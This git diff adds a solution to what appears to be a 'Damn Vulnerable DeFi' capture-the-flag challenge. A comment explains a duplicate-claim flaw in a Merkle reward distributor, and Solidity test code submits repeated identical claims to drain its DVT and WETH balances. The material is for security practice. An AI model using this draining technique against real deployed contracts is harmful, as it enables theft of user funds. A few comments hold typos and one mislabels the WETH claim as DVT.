@@ -148,7 +148,99 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
+        /*
+            Vulnerbality.
+
+            The vulnerability lies in the implementation of the claimRewards function, specifically in 
+            its handling of multiple claims within a single transaction. The function processes 
+            claims sequentially, but there's a critical timing mismatch between reward distribution and 
+            claim record updates.
+
+            When submitting the identical claims the function will keep transfering funds for each 
+            identical claim because it will not mark it as being claimed until the last iteration.
+
+            Therefore when multiple identical claims are submitted in a single transaction, the following occurs:
+
+            1. The function transfers the reward amount for each occurrence of the claim.
+            2. It only marks the claim as processed after the final occurrence
+
+            For example given a series of identical claims [A, A, A], this occurs:
+
+            * Iteration 1: Transfers reward for A, doesn’t mark as claimed
+            * Iteration 2: Transfers reward for A again, doesn’t mark as claimed
+            * Iteration 3: Transfers reward for A a third time, marks A as claimed
+
+            The reason the function behaves like this is because the function checks the last token
+            is not the same as the current claim token index and then will mark it as claimed:
+            
+            if (token != inputTokens[inputClaim.tokenIndex]) { // mark claimed }
+
+            However, if the tokenIndex is the same it thsi will be skipped because the token is already
+            set to the last token that was transferred.
+
+            Therefore our attack strategy is as follows;
+
+            1. Identify a valid, unclaimed reward associated with the attacker’s address.
+            2. Create an array of identical claim objects, all referencing the same valid claim.
+            3. Call the claimRewards function with the prepared array of identical claims.
+            4. Immediately withdraw or transfer the exploited funds to a separate address.
+        */
         
+        // Palyer address is 0x44E97aF4418b7a17AABD8090bEA0A471a366305C and can be looked up in the weth and dvt distributions json files
+        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
+        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        // determin the number of transactions requried to drain the contract.
+        // essentially this is the total amount in the contract divied by the players claim amount
+        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
+            PLAYER_DVT_CLAIM_AMOUNT;
+        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
+            PLAYER_WETH_CLAIM_AMOUNT;
+        uint totalTxCount = dvtTxCount + wethTxCount;
+
+        // prepare an array of tokens to claim
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        // Create players claims using the total amount of possible transactions
+        Claim[] memory claims = new Claim[](totalTxCount);
+
+        // create multiple duplicate player Claim objects for DVT & WETH token each with the same DVT claim amount, tokenIndex (0) and proof
+        for (uint i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_DVT_CLAIM_AMOUNT,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(dvtLeaves, 188) // players address is at index 188
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: PLAYER_WETH_CLAIM_AMOUNT,
+                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(wethLeaves, 188) // layers address is at index 188
+                });
+            }
+        }
+
+        // call claimRewards on the distributor with the full claims object array
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        // transfer all the claimed tokens to the recovery account
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
